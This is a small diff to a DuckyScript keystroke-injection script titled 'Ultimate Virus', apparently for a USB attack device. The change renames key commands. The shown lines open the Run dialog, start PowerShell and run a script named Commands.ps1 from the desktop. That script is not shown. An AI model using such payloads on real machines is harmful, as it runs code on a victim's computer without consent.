@@ -1,5 +1,5 @@
 REM Ultimate Virus by SirStilton9627
-WIN R
+GUI r
 DELAY 500
 STRING Powershell
 DELAY 200
@@ -14,5 +14,5 @@ DELAY 500
 STRING & "$env:USERPROFILE\Desktop\Ultimate_Virus\Commands.ps1"
 ENTER
 DELAY 100
-WIN D
+GUI d
 REM End
